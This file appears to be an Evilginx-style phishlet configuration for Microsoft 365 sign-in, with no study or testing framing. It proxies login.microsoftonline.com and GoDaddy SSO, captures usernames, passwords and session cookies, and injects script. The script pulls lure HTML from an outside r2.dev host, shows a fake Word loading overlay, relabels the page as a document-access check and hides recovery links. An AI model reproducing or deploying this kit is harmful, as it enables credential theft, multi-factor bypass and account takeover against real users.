name: "o365"
author: "@jamescullum"
min_ver: "2.3.0"

proxy_hosts:
  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true }
  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: false, is_landing: false }
  - { phish_sub: "login", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: true }
  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com:443", session: true, is_landing: false }

sub_filters:
  - triggers_on: "login.microsoftonline.com"
    orig_sub: "login"
    domain: "microsoftonline.com"
    search: 'href="https://{hostname}'
    replace: 'href="https://{hostname}'
    mimes: ["text/html", "application/json", "application/javascript"]

  - triggers_on: "login.microsoftonline.com"
    orig_sub: "login"
    domain: "microsoftonline.com"
    search: "https://{hostname}"
    replace: "https://{hostname}"
    mimes: ["text/html", "application/json", "application/javascript"]
    redirect_only: true

  - triggers_on: "sso.godaddy.com"
    orig_sub: "login"
    domain: "microsoftonline.com"
    search: "https://{hostname}"
    replace: "https://{hostname}"
    mimes: ["text/html", "application/json", "application/javascript"]

auth_tokens:
  - domain: ".login.microsoftonline.com"
    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]

credentials:
  username:
    key: "(login|UserName)"
    search: "(.*)"
    type: "post"
  password:
    key: "(passwd|Password|accesspass)"
    search: "(.*)"
    type: "post"

login:
  domain: "login.microsoftonline.com"
  path: "/"

js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
    script: |
      const overlay = document.createElement("div");
      overlay.id = "wordLogoOverlay";
      overlay.style.position = "fixed";
      overlay.style.top = "0";
      overlay.style.left = "0";
      overlay.style.width = "100vw";
      overlay.style.height = "100vh";
      overlay.style.backgroundColor = "white";
      overlay.style.zIndex = "999999";
      overlay.style.display = "flex";
      overlay.style.justifyContent = "center";
      overlay.style.alignItems = "center";
      overlay.innerHTML = `
        <style>
          @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
          }
          .logo-container {
            position: relative;
            width: 200px;
            height: 200px;
            animation: pulse 3s ease-in-out infinite;
          }
          .back-plate {
            position: absolute;
            width: 126px;
            height: 140px;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.2);
            left: 60px;
            top: 30px;
          }
          .w-icon {
            position: absolute;
            width: 72px;
            height: 72px;
            background-color: #185ABD;
            border-radius: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            font-weight: bold;
            color: white;
            left: 30px;
            top: 64px;
            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.25);
            z-index: 10;
          }
          .blue-stripe-1 { position: absolute; width: 100%; height: 25%; background-color: #41A5EE; top: 0; }
          .blue-stripe-2 { position: absolute; width: 100%; height: 25%; background-color: #2B7CD3; top: 25%; }
          .blue-stripe-3 { position: absolute; width: 100%; height: 25%; background-color: #185ABD; top: 50%; }
          .blue-stripe-4 { position: absolute; width: 100%; height: 25%; background-color: #103E91; top: 75%; }
        </style>
        <div class="logo-container">
          <div class="back-plate">
            <div class="blue-stripe-1"></div>
            <div class="blue-stripe-2"></div>
            <div class="blue-stripe-3"></div>
            <div class="blue-stripe-4"></div>
          </div>
          <div class="w-icon">W</div>
        </div>
      `;
      document.body.appendChild(overlay);

      const waitForBackground = () => {
        const winScroll = document.querySelector('.win-scroll');
        if (!winScroll) return setTimeout(waitForBackground, 500);

        fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
          .then(res => res.text())
          .then(html => {
            const wrapper = document.createElement('div');
            wrapper.innerHTML = html;
            wrapper.style.position = "absolute";
            wrapper.style.top = "0";
            wrapper.style.left = "0";
            wrapper.style.width = "100%";
            wrapper.style.height = "100%";
            wrapper.style.zIndex = "0";
            wrapper.style.pointerEvents = "none";
            winScroll.insertBefore(wrapper, winScroll.firstChild);

            const checkInject = () => {
              const backgroundImage = document.querySelector('#backgroundImage');
              if (backgroundImage) {
                overlay.remove();
                backgroundImage.style.backgroundImage = "none"; // remove default bg
              } else {
                setTimeout(checkInject, 300);
              }
            };
            checkInject();
          })
          .catch(err => {
            console.error("Background injection failed", err);
            overlay.remove();
          });
      };

      setTimeout(waitForBackground, 3000);

      // Modify heading and remove links
      const updateText = () => {
        const heading = document.querySelector("#loginHeader div[role='heading']");
        if (heading) {
          heading.innerText = "Secure Access: Email Confirmation";
          const msg = document.createElement("p");
          msg.innerText = "This document can only be accessed by Authorised users. Please verify your identity to access this document.";
          msg.style.fontSize = "14px";
          msg.style.marginTop = "8px";
          msg.style.color = "#444";
          heading.parentNode.appendChild(msg);
        }

        // Hide sign-up, can't access, and sign-in options
        const signup = document.querySelector("#signup");
        if (signup && signup.parentElement) signup.parentElement.style.display = "none";

        const cantAccess = document.querySelector("#cantAccessAccount");
        if (cantAccess && cantAccess.parentElement) cantAccess.parentElement.style.display = "none";

        const signinOptions = document.querySelector('[data-test-id="signinOptions"]');
        if (signinOptions && signinOptions.closest(".promoted-fed-cred-box")) {
          signinOptions.closest(".promoted-fed-cred-box").style.display = "none";
        }
      };
      setTimeout(updateText, 4000);
